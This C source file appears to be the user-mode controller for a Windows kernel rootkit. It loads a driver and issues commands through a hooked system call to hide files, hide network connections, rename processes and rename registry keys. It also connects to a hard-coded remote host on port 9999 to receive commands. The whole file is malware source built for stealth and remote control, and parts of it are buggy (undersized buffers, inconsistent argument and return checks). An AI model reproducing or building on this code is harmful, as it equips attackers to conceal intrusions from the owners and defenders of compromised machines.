#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include ".\..\command.h"
#include "install_driver.h"


#pragma comment(lib, "Ws2_32.lib")

#define sysenter __asm _emit 0x0F __asm _emit 0x34
#define SIGNATURE_SYSCALL 0xBAD0FACE
#define DRIVER_NAME "driver"
#define DRIVER_FILE "Driver.sys"

#define SERVER_PORT	9999

#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8))

typedef struct _CONNINFO101 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
} CONNINFO101, * PCONNINFO101;

typedef struct _CONNINFO102 {
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
} CONNINFO102, * PCONNINFO102;

typedef struct _CONNINFO110 {
	unsigned long size;
	unsigned long status;
	unsigned long src_addr;
	unsigned short src_port;
	unsigned short unk1;
	unsigned long dst_addr;
	unsigned short dst_port;
	unsigned short unk2;
	unsigned long pid;
	PVOID    unk3[35];
} CONNINFO110, * PCONNINFO110;

SOCKET sserver;

unsigned int AddressSystemCall;
__declspec(naked) void FastSystemCall(void) {
	__asm mov edx, esp
	__asm sysenter
}
__declspec(naked) void SysCall(void) {
	//__asm mov eax, <id>
	__asm mov edx, offset AddressSystemCall
	__asm call dword ptr[edx]
	__asm ret
}

int InitSocket();
int ConnectToServer();
unsigned char* RecvCommand();
int RecvMove(unsigned char* buffer, int* len);
void SendOK();

int main(int argc, char* argv[]) {
	if (argc > 1) {

		COMMAND cmd;
		unsigned int len;
		memset(&cmd, 0, sizeof(COMMAND));

		// START CLIENT
		if (!strcmp(argv[1], "server")) {
			unsigned char* commandBuffer;
			if (!InitSocket()) {
				return 1;
			}
			if (!ConnectToServer()) {
				return 1;
			}
			while (TRUE) {
				int res = 0;
				PCOMMAND cmd;
				printf("Wait command...\n");

				commandBuffer = RecvCommand();
				cmd = (PCOMMAND)commandBuffer;
				printf("Command %08X %08X %08X\n", (unsigned int)cmd->flags, (unsigned int)cmd->target, (unsigned int)cmd->change);
			}
		}
		// TEST SYSCALL
		else if (!strcmp(argv[1], "0x26")) {
			cmd.flags = COMMAND_TEST_COMMAND;
			cmd.target = NULL;
			cmd.change = NULL;
			__asm {
				push 0
				push 0
				lea eax, cmd
				push eax
				push SIGNATURE_SYSCALL
				mov eax, 0x26
			}
			AddressSystemCall = (unsigned int)FastSystemCall;
			SysCall();
		}
		// RENAME PROCESS PID
		else if (!strcmp(argv[1], "rpid")) {
			if (argc == 4) {
				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.target = (void*)strtoul(argv[2], NULL, 0);
				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		// RENAME PROCESS NAME
		else if (!strcmp(argv[1], "rname")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		// HIDE FILE
		else if (!strcmp(argv[1], "hfile")) {
			if (argc == 3) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				cmd.flags = COMMAND_HIDE_FILE | COMMAND_BUFFER_POINTER;

				cmd.change = NULL;
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide file\n");
		}
		// RENAME KEY
		else if (!strcmp(argv[1], "key")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_KEY | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide add key\n");
		}
		// ADD NET
		else if (!strcmp(argv[1], "net")) {
			if (argc > 1) {
				if (!strcmp(argv[2], "dst")) {
					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_DST_PORT;
				}
				else if (!strcmp(argv[2], "src")) {
					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_SRC_PORT;
				}
				cmd.target = (void*)strtoul(argv[3], NULL, 0);
				cmd.change = NULL;
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
		}
		// START DRIVER
		else if (!strcmp(argv[1], "start")) {
			char buf[2 * MAX_PATH];

			GetFullPathNameA(DRIVER_FILE, 2 * MAX_PATH, buf, NULL);

			if (!InstallDriver(DRIVER_NAME, buf))
				return 0;
			if (!StartDriver(DRIVER_NAME))
				return 0;

		}
		// STOP DRIVER
		else if (!strcmp(argv[2], "stop")) {

			if (!StopDriver(DRIVER_NAME))
				return 0;
			if (!RemoveDriver(DRIVER_NAME))
				return 0;

			printf("Driver unload");
		}
	}

	return 0;
}

int InitSocket() {
	WSADATA wsaData;
	int ires = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (ires != 0) {
		printf("WSAStartup exit with code %d\n", ires);
		return ires;
	}
}

int ConnectToServer() {
	struct sockaddr_in server;

	printf("Create socket\n");
	if ((sserver = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		printf("Error create socket with code %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("Connecting...\n");
	memset(&server, 0, sizeof server);
	server.sin_addr.s_addr = inet_addr("192.168.91.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(SERVER_PORT);

	if (connect(sserver, (struct sockaddr*)&server, sizeof(server)) < 0) {
		printf("Connect error with code %d\n", WSAGetLastError());
		closesocket(sserver);
		WSACleanup();
		return 1;
	}

	printf("Connected\n");
	return 0;
}

unsigned char* RecvCommand() {
	unsigned char* cmd;
	unsigned int exactSize = sizeof(COMMAND);
	unsigned char* bufferSize[4] = { 0 };

	if (!RecvMove(bufferSize, &exactSize)) {
		return "";
	}
	SendOK();

	cmd = (unsigned char*)malloc(exactSize);
	if (!RecvMove(cmd, &exactSize)) {
		return "";
	}
	SendOK();

	cmd[exactSize] = 0;
	return cmd;
}

int RecvMove(unsigned char* buffer, int* len) {
	int total = 0;
	int bytesleft = *len;
	int n = -1;

	while (total < *len) {
		n = recv(sserver, buffer + total, bytesleft, 0);
		if (n <= 0) break;
		total += n;
		bytesleft -= n;
	}

	*len = total;

	return (n <= 0) ? -1 : 0;
}

void SendOK() {
	send(sserver, "OK", 2, 0);
}
void SendFail() {
	send(sserver, "FAIL", 4, 0);
}